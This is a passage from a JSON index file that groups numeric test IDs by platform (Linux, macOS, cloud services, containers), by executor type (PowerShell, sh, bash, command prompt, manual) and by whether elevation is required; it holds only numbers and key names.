        1014,
        1015,
        1016,
        1017,
        1018,
        1019,
        1020,
        1021,
        1022,
        1023,
        1024,
        1025,
        1026,
        1027,
        1028,
        1029,
        1030,
        1031,
        1032,
        1033,
        1034,
        1035,
        1036,
        1037,
        1038,
        1039,
        1040,
        1041,
        1042,
        1043,
        1044,
        1045,
        1046,
        1047,
        1048,
        1049,
        1050,
        1051,
        1052,
        1053,
        1054,
        1055,
        1056,
        1057,
        1058,
        1059,
        1060,
        1061,
        1062,
        1063,
        1064,
        1065,
        1066,
        1067,
        1082,
        1083,
        1084,
        1085,
        1086,
        1087,
        1088,
        1089,
        1090,
        1091,
        1093,
        1095,
        1097,
        1102,
        1105,
        1106,
        1107,
        1108,
        1109,
        1110,
        1116,
        1117,
        1118,
        1119,
        1120,
        1121,
        1122,
        1123,
        1124,
        1125,
        1126,
        1128,
        1129,
        1130,
        1131,
        1135,
        1137,
        1142,
        1143,
        1144,
        1145,
        1146,
        1147,
        1148,
        1149,
        1151,
        1152,
        1153,
        1154,
        1155,
        1159,
        1160,
        1161,
        1162,
        1163,
        1164,
        1170,
        1171,
        1181,
        1182,
        1183,
        1184,
        1188,
        1189,
        1190,
        1196,
        1197,
        1199,
        1201,
        1208,
        1209,
        1210,
        1211,
        1212,
        1213,
        1215,
        1216,
        1217,
        1218,
        1219,
        1220,
        1221,
        1222,
        1223,
        1224,
        1225,
        1226,
        1227,
        1228,
        1240,
        1241,
        1242,
        1243,
        1244,
        1245,
        1246,
        1247,
        1248,
        1249,
        1250,
        1251,
        1252,
        1253,
        1254,
        1255,
        1256,
        1257,
        1258,
        1259,
        1261,
        1262,
        1263,
        1264,
        1265,
        1266,
        1267,
        1268,
        1269,
        1270,
        1271,
        1272,
        1273,
        1274,
        1275,
        1276,
        1277,
        1278,
        1279,
        1280,
        1281,
        1282,
        1283,
        1284,
        1285,
        1286,
        1287,
        1288,
        1289,
        1290,
        1291,
        1292,
        1293,
        1294,
        1295,
        1296,
        1297,
        1301,
        1305,
        1306,
        1307,
        1308,
        1309,
        1310,
        1311,
        1312,
        1313,
        1325,
        1326,
        1327,
        1328,
        1329,
        1330,
        1331,
        1332,
        1333,
        1334,
        1335,
        1336,
        1337,
        1338,
        1339,
        1340,
        1341,
        1342,
        1343,
        1344,
        1345,
        1346,
        1347,
        1348,
        1349,
        1350,
        1351,
        1358,
        1359,
        1360,
        1361,
        1362,
        1364,
        1368,
        1369,
        1371,
        1372,
        1373,
        1374,
        1375,
        1376,
        1377,
        1378,
        1382,
        1383,
        1386,
        1394,
        1395,
        1396,
        1397,
        1398,
        1399,
        1402,
        1403,
        1408,
        1413,
        1414,
        1415,
        1416,
        1417,
        1418,
        1419,
        1420,
        1421,
        1422,
        1423,
        1424,
        1425,
        1426,
        1427,
        1428,
        1433,
        1435,
        1436,
        1437,
        1438,
        1439,
        1440,
        1442,
        1443,
        1444,
        1445,
        1447,
        1448,
        1449,
        1450,
        1451,
        1453,
        1454,
        1458,
        1459,
        1460,
        1461,
        1462,
        1463,
        1464,
        1465,
        1466,
        1467,
        1468,
        1469,
        1470,
        1471,
        1472,
        1473,
        1474,
        1475,
        1476,
        1477,
        1478,
        1479,
        1480,
        1481,
        1482,
        1483,
        1484,
        1490,
        1491,
        1492,
        1497,
        1510,
        1511,
        1512,
        1513,
        1514,
        1515,
        1516,
        1517,
        1518,
        1519,
        1520,
        1521,
        1522,
        1523,
        1524,
        1526,
        1527,
        1528,
        1529,
        1530,
        1531,
        1532,
        1533,
        1534,
        1535,
        1536,
        1537,
        1543,
        1544,
        1547,
        1548,
        1550,
        1551,
        1552,
        1553,
        1554,
        1555,
        1556,
        1557,
        1559,
        1560,
        1561,
        1562,
        1563,
        1564,
        1565,
        1566,
        1567,
        1568,
        1579,
        1580,
        1581,
        1582,
        1583,
        1584,
        1585,
        1586,
        1600,
        1601,
        1602,
        1603,
        1604,
        1605,
        1610,
        1611,
        1612,
        1613,
        1614,
        1615,
        1616,
        1617,
        1618,
        1619,
        1630,
        1632,
        1633,
        1636,
        1637,
        1638,
        1639,
        1640,
        1641,
        1644,
        1645,
        1649,
        1650,
        1651,
        1654,
        1655,
        1656,
        1657,
        1658,
        1659,
        1660,
        1661,
        1662,
        1663,
        1664,
        1665,
        1667,
        1668,
        1669,
        1670,
        1672,
        1674,
        1675,
        1677,
        1678,
        1679,
        1680,
        1681,
        1682,
        1683,
        1684,
        1686,
        1687,
        1688,
        1689,
        1693,
        1694,
        1695,
        1696,
        1697,
        1698,
        1699,
        1703,
        1704,
        1705,
        1706,
        1707,
        1708,
        1709,
        1715,
        1716,
        1727,
        1729,
        1730,
        1735,
        1736,
        1737,
        1738,
        1739,
        1740,
        1741,
        1742,
        1743,
        1748,
        1749,
        1752,
        1754,
        1759,
        1760
      ],
      "linux": [
        2,
        46,
        47,
        48,
        49,
        50,
        51,
        52,
        53,
        54,
        56,
        61,
        66,
        74,
        75,
        76,
        77,
        80,
        88,
        98,
        99,
        104,
        105,
        106,
        107,
        134,
        144,
        145,
        146,
        147,
        152,
        153,
        154,
        157,
        158,
        159,
        162,
        171,
        180,
        181,
        182,
        186,
        191,
        192,
        198,
        199,
        207,
        208,
        209,
        210,
        211,
        212,
        216,
        217,
        227,
        238,
        239,
        241,
        243,
        244,
        245,
        246,
        248,
        253,
        257,
        258,
        259,
        262,
        264,
        265,
        266,
        267,
        280,
        281,
        282,
        312,
        313,
        314,
        315,
        316,
        317,
        323,
        362,
        363,
        364,
        365,
        366,
        367,
        368,
        369,
        370,
        371,
        372,
        373,
        374,
        375,
        376,
        377,
        378,
        382,
        383,
        384,
        385,
        389,
        410,
        416,
        417,
        420,
        422,
        425,
        428,
        433,
        434,
        435,
        436,
        437,
        438,
        439,
        440,
        441,
        442,
        443,
        444,
        445,
        450,
        451,
        452,
        457,
        466,
        467,
        468,
        469,
        477,
        480,
        485,
        494,
        506,
        507,
        508,
        509,
        510,
        517,
        518,
        519,
        520,
        522,
        526,
        539,
        540,
        557,
        558,
        562,
        564,
        565,
        566,
        567,
        568,
        569,
        597,
        598,
        599,
        604,
        610,
        634,
        635,
        636,
        637,
        638,
        639,
        640,
        648,
        661,
        683,
        684,
        685,
        697,
        699,
        793,
        794,
        795,
        796,
        807,
        821,
        831,
        832,
        849,
        850,
        860,
        861,
        865,
        866,
        873,
        874,
        889,
        890,
        891,
        892,
        893,
        894,
        895,
        896,
        898,
        899,
        900,
        907,
        912,
        913,
        914,
        915,
        916,
        947,
        950,
        1068,
        1069,
        1070,
        1071,
        1072,
        1073,
        1074,
        1075,
        1076,
        1077,
        1078,
        1079,
        1080,
        1081,
        1094,
        1098,
        1099,
        1100,
        1101,
        1111,
        1112,
        1113,
        1114,
        1115,
        1132,
        1133,
        1134,
        1141,
        1157,
        1158,
        1172,
        1173,
        1174,
        1175,
        1176,
        1177,
        1178,
        1179,
        1180,
        1185,
        1191,
        1205,
        1206,
        1207,
        1229,
        1230,
        1231,
        1232,
        1233,
        1234,
        1235,
        1236,
        1237,
        1238,
        1239,
        1298,
        1315,
        1316,
        1317,
        1318,
        1319,
        1320,
        1321,
        1322,
        1323,
        1324,
        1352,
        1353,
        1354,
        1355,
        1356,
        1357,
        1363,
        1365,
        1367,
        1370,
        1379,
        1380,
        1381,
        1384,
        1385,
        1387,
        1388,
        1389,
        1390,
        1391,
        1392,
        1393,
        1406,
        1409,
        1410,
        1411,
        1441,
        1455,
        1456,
        1457,
        1485,
        1486,
        1487,
        1488,
        1489,
        1493,
        1494,
        1495,
        1496,
        1498,
        1499,
        1500,
        1501,
        1502,
        1503,
        1504,
        1538,
        1539,
        1540,
        1541,
        1542,
        1546,
        1549,
        1558,
        1569,
        1570,
        1571,
        1572,
        1573,
        1574,
        1575,
        1576,
        1577,
        1578,
        1587,
        1588,
        1589,
        1590,
        1591,
        1592,
        1593,
        1594,
        1595,
        1596,
        1597,
        1598,
        1599,
        1606,
        1607,
        1608,
        1609,
        1623,
        1624,
        1625,
        1631,
        1634,
        1635,
        1642,
        1671,
        1676,
        1685,
        1690,
        1691,
        1692,
        1700,
        1701,
        1713,
        1716,
        1728,
        1731,
        1732,
        1733,
        1734,
        1755,
        1756
      ],
      "macos": [
        57,
        63,
        80,
        85,
        88,
        98,
        99,
        129,
        134,
        144,
        145,
        148,
        149,
        152,
        153,
        154,
        157,
        158,
        159,
        162,
        182,
        185,
        186,
        189,
        190,
        193,
        194,
        195,
        200,
        205,
        206,
        216,
        217,
        227,
        238,
        239,
        241,
        243,
        246,
        257,
        258,
        264,
        265,
        318,
        319,
        321,
        323,
        355,
        362,
        363,
        375,
        376,
        378,
        389,
        416,
        418,
        419,
        421,
        423,
        424,
        426,
        427,
        429,
        430,
        431,
        432,
        436,
        438,
        439,
        441,
        442,
        443,
        450,
        451,
        466,
        467,
        468,
        469,
        474,
        478,
        481,
        485,
        494,
        498,
        500,
        501,
        502,
        503,
        516,
        517,
        522,
        526,
        527,
        547,
        557,
        558,
        565,
        566,
        567,
        569,
        570,
        599,
        600,
        605,
        634,
        635,
        636,
        637,
        638,
        639,
        640,
        648,
        665,
        698,
        791,
        792,
        805,
        818,
        821,
        831,
        848,
        862,
        889,
        890,
        891,
        894,
        895,
        896,
        898,
        899,
        900,
        901,
        919,
        948,
        949,
        955,
        1068,
        1069,
        1070,
        1071,
        1072,
        1073,
        1074,
        1075,
        1076,
        1078,
        1080,
        1094,
        1103,
        1104,
        1127,
        1132,
        1136,
        1138,
        1139,
        1140,
        1141,
        1150,
        1156,
        1172,
        1173,
        1174,
        1191,
        1192,
        1193,
        1198,
        1200,
        1202,
        1203,
        1204,
        1214,
        1229,
        1230,
        1236,
        1238,
        1260,
        1299,
        1300,
        1302,
        1303,
        1304,
        1314,
        1315,
        1317,
        1319,
        1352,
        1354,
        1356,
        1363,
        1365,
        1366,
        1367,
        1370,
        1379,
        1380,
        1381,
        1384,
        1387,
        1390,
        1392,
        1407,
        1412,
        1429,
        1430,
        1431,
        1432,
        1434,
        1446,
        1485,
        1486,
        1487,
        1488,
        1489,
        1505,
        1506,
        1507,
        1508,
        1509,
        1546,
        1569,
        1571,
        1623,
        1624,
        1625,
        1642,
        1643,
        1646,
        1647,
        1648,
        1652,
        1653,
        1671,
        1673,
        1685,
        1690,
        1691,
        1692,
        1702,
        1713,
        1716,
        1728,
        1750,
        1757,
        1758
      ],
      "containers": [
        224,
        263,
        283,
        284,
        395,
        673,
        869,
        907,
        1404,
        1405,
        1718,
        1719,
        1720,
        1721,
        1722,
        1723,
        1724,
        1725,
        1726
      ],
      "google-workspace": [
        512
      ],
      "iaas:gcp": [
        512,
        514,
        627,
        1096,
        1629,
        1712
      ],
      "iaas:azure": [
        513,
        616,
        617,
        1165,
        1167,
        1168,
        1169,
        1187,
        1401,
        1452,
        1621,
        1711,
        1745,
        1746,
        1747
      ],
      "azure-ad": [
        538,
        614,
        615,
        618,
        628,
        629,
        632,
        633,
        681,
        691,
        694,
        876,
        877,
        1092,
        1194,
        1195,
        1400,
        1717
      ],
      "iaas:aws": [
        613,
        630,
        696,
        875,
        923,
        1166,
        1186,
        1363,
        1545,
        1620,
        1623,
        1624,
        1625,
        1626,
        1627,
        1710,
        1713,
        1714,
        1744,
        1751,
        1753
      ],
      "office-365": [
        631,
        801,
        802,
        1525,
        1622,
        1628,
        1666
      ]
    },
    "by_executor_type": {
      "powershell": [
        0,
        1,
        4,
        5,
        6,
        7,
        8,
        9,
        11,
        17,
        19,
        20,
        21,
        22,
        27,
        29,
        30,
        38,
        42,
        45,
        55,
        58,
        65,
        69,
        70,
        82,
        89,
        90,
        91,
        100,
        108,
        109,
        110,
        111,
        112,
        114,
        115,
        116,
        117,
        118,
        122,
        125,
        126,
        127,
        130,
        131,
        132,
        135,
        136,
        138,
        139,
        140,
        142,
        151,
        155,
        156,
        157,
        158,
        160,
        163,
        164,
        165,
        166,
        168,
        169,
        175,
        176,
        183,
        184,
        197,
        213,
        214,
        215,
        218,
        219,
        220,
        221,
        222,
        223,
        225,
        226,
        235,
        240,
        247,
        249,
        250,
        251,
        252,
        255,
        256,
        260,
        271,
        272,
        273,
        275,
        276,
        285,
        287,
        288,
        289,
        290,
        291,
        292,
        293,
        294,
        295,
        296,
        297,
        298,
        299,
        300,
        301,
        303,
        304,
        305,
        306,
        307,
        308,
        309,
        310,
        311,
        320,
        322,
        325,
        326,
        329,
        330,
        332,
        334,
        335,
        336,
        342,
        343,
        344,
        345,
        346,
        347,
        348,
        350,
        351,
        352,
        353,
        354,
        356,
        359,
        379,
        380,
        381,
        388,
        391,
        392,
        394,
        397,
        399,
        400,
        401,
        402,
        404,
        405,
        406,
        407,
        408,
        412,
        414,
        415,
        446,
        447,
        448,
        449,
        455,
        456,
        458,
        459,
        463,
        470,
        471,
        472,
        473,
        475,
        476,
        479,
        482,
        483,
        486,
        487,
        488,
        489,
        492,
        493,
        495,
        504,
        505,
        513,
        524,
        528,
        529,
        530,
        531,
        532,
        533,
        534,
        535,
        536,
        537,
        538,
        548,
        556,
        559,
        560,
        563,
        572,
        576,
        578,
        584,
        585,
        586,
        587,
        588,
        589,
        590,
        591,
        592,
        593,
        594,
        595,
        596,
        601,
        602,
        603,
        606,
        607,
        608,
        609,
        611,
        612,
        614,
        615,
        616,
        617,
        618,
        620,
        621,
        622,
        623,
        624,
        625,
        626,
        628,
        629,
        631,
        632,
        633,
        642,
        644,
        649,
        651,
        655,
        666,
        668,
        669,
        670,
        671,
        672,
        675,
        676,
        677,
        678,
        680,
        681,
        682,
        686,
        689,
        690,
        691,
        692,
        693,
        694,
        695,
        700,
        704,
        705,
        706,
        707,
        709,
        711,
        757,
        760,
        772,
        797,
        798,
        799,
        800,
        801,
        802,
        804,
        806,
        809,
        810,
        812,
        813,
        815,
        816,
        820,
        833,
        834,
        835,
        836,
        837,
        838,
        839,
        840,
        841,
        842,
        843,
        844,
        845,
        846,
        852,
        854,
        855,
        856,
        858,
        859,
        864,
        868,
        872,
        876,
        877,
        879,
        880,
        882,
        883,
        884,
        885,
        886,
        902,
        903,
        904,
        905,
        909,
        920,
        921,
        927,
        928,
        929,
        931,
        932,
        933,
        934,
        935,
        936,
        937,
        938,
        939,
        940,
        941,
        942,
        943,
        951,
        956,
        957,
        962,
        963,
        964,
        965,
        970,
        972,
        973,
        976,
        977,
        978,
        979,
        980,
        985,
        986,
        987,
        988,
        989,
        990,
        991,
        992,
        995,
        996,
        997,
        998,
        999,
        1000,
        1001,
        1007,
        1008,
        1009,
        1010,
        1017,
        1032,
        1038,
        1039,
        1040,
        1041,
        1042,
        1043,
        1044,
        1045,
        1046,
        1047,
        1048,
        1049,
        1050,
        1051,
        1052,
        1053,
        1061,
        1084,
        1087,
        1088,
        1091,
        1092,
        1093,
        1105,
        1107,
        1120,
        1125,
        1128,
        1129,
        1131,
        1135,
        1137,
        1142,
        1145,
        1146,
        1147,
        1149,
        1151,
        1152,
        1153,
        1155,
        1162,
        1163,
        1165,
        1166,
        1167,
        1168,
        1169,
        1187,
        1190,
        1194,
        1195,
        1196,
        1197,
        1199,
        1201,
        1210,
        1213,
        1215,
        1216,
        1217,
        1218,
        1222,
        1226,
        1227,
        1228,
        1241,
        1251,
        1254,
        1255,
        1258,
        1259,
        1261,
        1262,
        1263,
        1264,
        1266,
        1270,
        1271,
        1272,
        1273,
        1274,
        1276,
        1277,
        1278,
        1279,
        1280,
        1281,
        1282,
        1284,
        1288,
        1289,
        1290,
        1291,
        1292,
        1293,
        1294,
        1295,
        1296,
        1297,
        1301,
        1305,
        1307,
        1309,
        1310,
        1311,
        1312,
        1313,
        1326,
        1328,
        1329,
        1331,
        1342,
        1343,
        1344,
        1345,
        1346,
        1347,
        1348,
        1360,
        1362,
        1364,
        1368,
        1371,
        1372,
        1373,
        1374,
        1375,
        1376,
        1377,
        1394,
        1395,
        1396,
        1397,
        1398,
        1400,
        1401,
        1403,
        1413,
        1414,
        1415,
        1416,
        1417,
        1418,
        1419,
        1421,
        1422,
        1423,
        1424,
        1425,
        1426,
        1427,
        1428,
        1433,
        1436,
        1437,
        1438,
        1439,
        1440,
        1442,
        1443,
        1444,
        1445,
        1447,
        1448,
        1451,
        1452,
        1453,
        1454,
        1458,
        1459,
        1460,
        1461,
        1462,
        1463,
        1465,
        1466,
        1467,
        1468,
        1469,
        1470,
        1471,
        1480,
        1490,
        1492,
        1512,
        1513,
        1515,
        1517,
        1518,
        1520,
        1521,
        1522,
        1523,
        1524,
        1525,
        1527,
        1528,
        1529,
        1530,
        1533,
        1534,
        1535,
        1543,
        1548,
        1549,
        1550,
        1551,
        1552,
        1554,
        1556,
        1557,
        1559,
        1560,
        1561,
        1566,
        1567,
        1568,
        1580,
        1585,
        1586,
        1601,
        1604,
        1610,
        1612,
        1614,
        1616,
        1618,
        1619,
        1621,
        1622,
        1628,
        1631,
        1633,
        1637,
        1639,
        1641,
        1650,
        1651,
        1655,
        1657,
        1659,
        1661,
        1665,
        1666,
        1667,
        1668,
        1669,
        1670,
        1671,
        1672,
        1677,
        1681,
        1682,
        1683,
        1684,
        1686,
        1687,
        1688,
        1689,
        1693,
        1699,
        1703,
        1705,
        1707,
        1708,
        1709,
        1715,
        1716,
        1717,
        1738,
        1740,
        1741,
        1742,
        1743,
        1745,
        1746,
        1747,
        1748,
        1749,
        1751,
        1752,
        1753,
        1754,
        1759
      ],
      "sh": [
        2,
        46,
        47,
        48,
        51,
        52,
        53,
        54,
        57,
        63,
        66,
        74,
        75,
        76,
        77,
        80,
        98,
        99,
        104,
        105,
        106,
        107,
        129,
        134,
        144,
        145,
        146,
        147,
        148,
        149,
        152,
        153,
        154,
        159,
        162,
        171,
        180,
        181,
        182,
        186,
        192,
        193,
        199,
        207,
        208,
        217,
        224,
        227,
        238,
        239,
        244,
        245,
        253,
        258,
        259,
        262,
        264,
        266,
        281,
        282,
        312,
        313,
        314,
        316,
        317,
        323,
        355,
        362,
        363,
        364,
        365,
        366,
        367,
        368,
        369,
        370,
        372,
        373,
        374,
        375,
        376,
        377,
        378,
        382,
        383,
        384,
        385,
        389,
        395,
        410,
        416,
        417,
        418,
        419,
        420,
        421,
        422,
        423,
        424,
        425,
        426,
        427,
        428,
        429,
        430,
        431,
        432,
        433,
        436,
        437,
        438,
        439,
        440,
        441,
        443,
        444,
        450,
        451,
        452,
        457,
        466,
        467,
        468,
        469,
        474,
        485,
        494,
        498,
        508,
        510,
        512,
        514,
        516,
        517,
        520,
        522,
        526,
        527,
        539,
        540,
        547,
        557,
        558,
        562,
        564,
        565,
        566,
        567,
        568,
        569,
        570,
        597,
        598,
        599,
        600,
        604,
        605,
        613,
        627,
        630,
        634,
        635,
        636,
        637,
        638,
        640,
        648,
        661,
        665,
        696,
        699,
        794,
        796,
        807,
        818,
        821,
        831,
        832,
        848,
        850,
        861,
        866,
        873,
        874,
        875,
        889,
        890,
        891,
        892,
        893,
        894,
        895,
        913,
        923,
        947,
        948,
        949,
        950,
        955,
        1068,
        1069,
        1070,
        1074,
        1076,
        1077,
        1078,
        1079,
        1080,
        1081,
        1094,
        1096,
        1098,
        1099,
        1100,
        1101,
        1103,
        1104,
        1111,
        1112,
        1113,
        1114,
        1127,
        1132,
        1133,
        1134,
        1136,
        1138,
        1139,
        1140,
        1141,
        1150,
        1156,
        1157,
        1158,
        1172,
        1173,
        1174,
        1175,
        1176,
        1178,
        1179,
        1186,
        1191,
        1192,
        1193,
        1200,
        1206,
        1229,
        1230,
        1231,
        1232,
        1233,
        1234,
        1236,
        1237,
        1238,
        1239,
        1260,
        1302,
        1303,
        1304,
        1315,
        1316,
        1317,
        1318,
        1319,
        1320,
        1321,
        1322,
        1323,
        1324,
        1352,
        1353,
        1354,
        1355,
        1356,
        1357,
        1363,
        1365,
        1367,
        1379,
        1380,
        1381,
        1384,
        1385,
        1387,
        1388,
        1389,
        1390,
        1391,
        1392,
        1393,
        1406,
        1407,
        1409,
        1410,
        1411,
        1412,
        1429,
        1430,
        1431,
        1432,
        1434,
        1441,
        1446,
        1455,
        1456,
        1457,
        1486,
        1487,
        1488,
        1493,
        1494,
        1495,
        1496,
        1498,
        1499,
        1500,
        1501,
        1502,
        1503,
        1504,
        1505,
        1506,
        1507,
        1508,
        1509,
        1538,
        1539,
        1540,
        1541,
        1542,
        1546,
        1569,
        1570,
        1575,
        1577,
        1587,
        1588,
        1589,
        1590,
        1591,
        1592,
        1593,
        1594,
        1595,
        1596,
        1597,
        1598,
        1599,
        1607,
        1609,
        1620,
        1623,
        1624,
        1625,
        1626,
        1627,
        1629,
        1634,
        1635,
        1642,
        1643,
        1646,
        1647,
        1648,
        1652,
        1653,
        1685,
        1691,
        1692,
        1710,
        1711,
        1712,
        1713,
        1721,
        1722,
        1723,
        1724,
        1725,
        1726,
        1731,
        1732,
        1733,
        1734,
        1744
      ],
      "command_prompt": [
        3,
        10,
        12,
        13,
        15,
        16,
        18,
        23,
        24,
        25,
        26,
        28,
        31,
        32,
        33,
        34,
        35,
        36,
        37,
        39,
        40,
        41,
        43,
        44,
        59,
        60,
        62,
        64,
        67,
        68,
        71,
        72,
        73,
        78,
        79,
        81,
        83,
        84,
        86,
        87,
        92,
        93,
        94,
        95,
        96,
        97,
        101,
        102,
        103,
        113,
        119,
        120,
        121,
        123,
        124,
        128,
        133,
        137,
        143,
        150,
        161,
        167,
        170,
        172,
        173,
        174,
        177,
        178,
        179,
        187,
        188,
        196,
        201,
        202,
        203,
        204,
        228,
        229,
        230,
        231,
        232,
        233,
        234,
        236,
        237,
        242,
        254,
        261,
        268,
        269,
        270,
        274,
        277,
        278,
        279,
        286,
        302,
        324,
        327,
        328,
        331,
        333,
        337,
        338,
        339,
        340,
        349,
        357,
        358,
        360,
        361,
        386,
        387,
        390,
        393,
        396,
        398,
        403,
        409,
        411,
        413,
        453,
        454,
        460,
        461,
        462,
        464,
        465,
        484,
        490,
        491,
        496,
        497,
        499,
        511,
        515,
        521,
        523,
        525,
        541,
        542,
        543,
        544,
        545,
        546,
        549,
        550,
        551,
        552,
        553,
        554,
        555,
        561,
        571,
        573,
        574,
        575,
        577,
        579,
        580,
        581,
        582,
        583,
        619,
        641,
        643,
        645,
        646,
        647,
        650,
        652,
        653,
        654,
        656,
        657,
        658,
        659,
        660,
        662,
        663,
        664,
        667,
        674,
        679,
        687,
        688,
        701,
        702,
        703,
        708,
        710,
        712,
        713,
        714,
        715,
        716,
        717,
        718,
        719,
        720,
        721,
        722,
        723,
        724,
        725,
        726,
        727,
        728,
        729,
        730,
        731,
        732,
        733,
        734,
        735,
        736,
        737,
        738,
        739,
        740,
        741,
        742,
        743,
        744,
        745,
        746,
        747,
        748,
        749,
        750,
        751,
        752,
        753,
        754,
        755,
        756,
        758,
        759,
        761,
        762,
        763,
        764,
        765,
        766,
        767,
        768,
        769,
        770,
        771,
        773,
        774,
        775,
        776,
        777,
        778,
        779,
        780,
        781,
        782,
        783,
        784,
        785,
        786,
        787,
        788,
        789,
        790,
        803,
        808,
        811,
        814,
        817,
        819,
        822,
        823,
        824,
        825,
        826,
        827,
        828,
        829,
        830,
        847,
        851,
        853,
        857,
        863,
        867,
        870,
        871,
        878,
        881,
        887,
        888,
        897,
        906,
        908,
        910,
        911,
        917,
        918,
        922,
        924,
        925,
        926,
        930,
        944,
        945,
        946,
        952,
        953,
        954,
        958,
        959,
        960,
        961,
        966,
        967,
        968,
        969,
        971,
        974,
        975,
        981,
        982,
        983,
        984,
        993,
        994,
        1002,
        1003,
        1004,
        1005,
        1006,
        1011,
        1012,
        1013,
        1014,
        1015,
        1016,
        1018,
        1019,
        1020,
        1021,
        1022,
        1023,
        1024,
        1025,
        1026,
        1027,
        1028,
        1029,
        1030,
        1031,
        1033,
        1034,
        1035,
        1036,
        1037,
        1054,
        1055,
        1056,
        1057,
        1058,
        1059,
        1060,
        1062,
        1063,
        1064,
        1065,
        1066,
        1067,
        1082,
        1083,
        1085,
        1086,
        1089,
        1090,
        1095,
        1097,
        1102,
        1106,
        1108,
        1109,
        1110,
        1116,
        1117,
        1118,
        1119,
        1121,
        1122,
        1123,
        1124,
        1126,
        1130,
        1143,
        1144,
        1148,
        1154,
        1159,
        1160,
        1161,
        1164,
        1170,
        1171,
        1181,
        1182,
        1183,
        1184,
        1188,
        1189,
        1208,
        1209,
        1211,
        1212,
        1219,
        1220,
        1221,
        1223,
        1224,
        1225,
        1240,
        1242,
        1243,
        1244,
        1245,
        1246,
        1247,
        1248,
        1249,
        1250,
        1252,
        1253,
        1256,
        1257,
        1265,
        1267,
        1268,
        1269,
        1275,
        1283,
        1285,
        1286,
        1287,
        1306,
        1308,
        1325,
        1327,
        1330,
        1332,
        1333,
        1334,
        1335,
        1336,
        1337,
        1338,
        1339,
        1340,
        1341,
        1349,
        1350,
        1351,
        1358,
        1359,
        1361,
        1369,
        1378,
        1382,
        1383,
        1386,
        1399,
        1402,
        1408,
        1420,
        1435,
        1449,
        1450,
        1464,
        1472,
        1473,
        1474,
        1475,
        1476,
        1478,
        1481,
        1482,
        1483,
        1484,
        1491,
        1497,
        1510,
        1511,
        1514,
        1516,
        1519,
        1526,
        1531,
        1532,
        1536,
        1537,
        1544,
        1547,
        1553,
        1555,
        1562,
        1563,
        1564,
        1565,
        1579,
        1581,
        1582,
        1583,
        1584,
        1600,
        1602,
        1603,
        1605,
        1611,
        1613,
        1615,
        1617,
        1630,
        1632,
        1636,
        1638,
        1640,
        1644,
        1645,
        1649,
        1654,
        1656,
        1658,
        1660,
        1662,
        1663,
        1664,
        1674,
        1675,
        1678,
        1679,
        1680,
        1694,
        1695,
        1696,
        1697,
        1698,
        1704,
        1706,
        1714,
        1727,
        1729,
        1730,
        1735,
        1736,
        1737,
        1739,
        1760
      ],
      "manual": [
        14,
        141,
        185,
        189,
        246,
        248,
        341,
        610,
        898,
        899,
        900,
        901,
        1477,
        1479,
        1571,
        1750
      ],
      "bash": [
        49,
        50,
        56,
        61,
        85,
        88,
        190,
        191,
        194,
        195,
        198,
        200,
        205,
        206,
        209,
        210,
        211,
        212,
        216,
        241,
        243,
        257,
        263,
        265,
        267,
        280,
        283,
        284,
        315,
        318,
        319,
        321,
        371,
        434,
        435,
        442,
        445,
        477,
        478,
        480,
        481,
        500,
        501,
        502,
        503,
        506,
        507,
        509,
        518,
        519,
        639,
        673,
        683,
        684,
        685,
        697,
        698,
        791,
        792,
        793,
        795,
        805,
        849,
        860,
        862,
        865,
        869,
        896,
        907,
        912,
        914,
        915,
        916,
        919,
        1071,
        1072,
        1073,
        1075,
        1115,
        1177,
        1180,
        1185,
        1198,
        1202,
        1203,
        1204,
        1205,
        1207,
        1214,
        1235,
        1298,
        1299,
        1300,
        1314,
        1366,
        1370,
        1404,
        1405,
        1485,
        1489,
        1545,
        1558,
        1572,
        1573,
        1574,
        1576,
        1578,
        1606,
        1608,
        1673,
        1676,
        1690,
        1700,
        1701,
        1702,
        1718,
        1719,
        1720,
        1728,
        1755,
        1756,
        1757,
        1758
      ]
    },
    "by_elevation": {
      "required": [
        0,
        1,
        3,
        4,
        5,
        6,
        7,
        10,
        11,
        12,
        13,
        15,
        16,
        17,
        18,
        19,
        20,
        21,
        22,
        23,
        24,
        25,
        26,
        27,
        31,
        32,
        33,
        34,
        35,
        36,
        37,
        38,
        39,
        40,
        41,
        42,
        46,
        47,
        48,
        49,
        50,
        51,
        53,
        54,
        58,
        59,
        68,
        69,
        71,
        72,
        74,
        75,
        76,
        77,
        85,
        100,
        101,
        118,
        119,
        123,
        124,
        127,
        129,
        130,
        132,
        142,
        156,
        177,
        178,
        179,
        181,
        184,
        190,
        191,
        192,
        193,
        194,
        195,
        196,
        197,
        198,
        199,
        200,
        201,
        202,
        203,
        204,
        205,
        206,
        207,
        208,
        209,
        210,
        211,
        212,
        213,
        217,
        218,
        226,
        227,
        235,
        237,
        252,
        260,
        265,
        266,
        267,
        268,
        270,
        273,
        275,
        277,
        278,
        279,
        280,
        282,
        289,
        297,
        298,
        300,
        310,
        311,
        312,
        313,
        314,
        316,
        317,
        322,
        329,
        330,
        333,
        336,
        344,
        350,
        361,
        371,
        378,
        409,
        411,
        413,
        414,
        415,
        416,
        417,
        418,
        419,
        420,
        421,
        422,
        423,
        424,
        425,
        426,
        427,
        428,
        429,
        430,
        431,
        432,
        433,
        434,
        435,
        445,
        458,
        460,
        464,
        465,
        468,
        475,
        476,
        477,
        478,
        479,
        480,
        481,
        490,
        491,
        496,
        497,
        498,
        499,
        500,
        501,
        502,
        503,
        504,
        505,
        506,
        507,
        508,
        509,
        510,
        511,
        518,
        519,
        538,
        542,
        550,
        565,
        601,
        604,
        611,
        619,
        635,
        645,
        646,
        663,
        664,
        666,
        668,
        669,
        670,
        671,
        683,
        684,
        685,
        687,
        702,
        703,
        704,
        708,
        709,
        710,
        711,
        712,
        713,
        714,
        715,
        716,
        717,
        718,
        719,
        720,
        721,
        722,
        723,
        724,
        725,
        726,
        727,
        728,
        729,
        730,
        731,
        733,
        734,
        735,
        736,
        737,
        738,
        739,
        742,
        743,
        744,
        745,
        746,
        747,
        748,
        749,
        750,
        751,
        752,
        753,
        754,
        755,
        756,
        757,
        758,
        770,
        771,
        772,
        773,
        774,
        775,
        776,
        777,
        778,
        779,
        780,
        781,
        782,
        783,
        784,
        785,
        786,
        787,
        788,
        789,
        790,
        799,
        834,
        835,
        836,
        838,
        839,
        840,
        847,
        849,
        850,
        860,
        861,
        862,
        863,
        864,
        865,
        866,
        867,
        868,
        879,
        902,
        922,
        942,
        943,
        956,
        957,
        958,
        970,
        1017,
        1039,
        1040,
        1041,
        1042,
        1043,
        1044,
        1045,
        1046,
        1047,
        1048,
        1049,
        1051,
        1052,
        1053,
        1059,
        1060,
        1061,
        1066,
        1067,
        1080,
        1081,
        1090,
        1091,
        1102,
        1106,
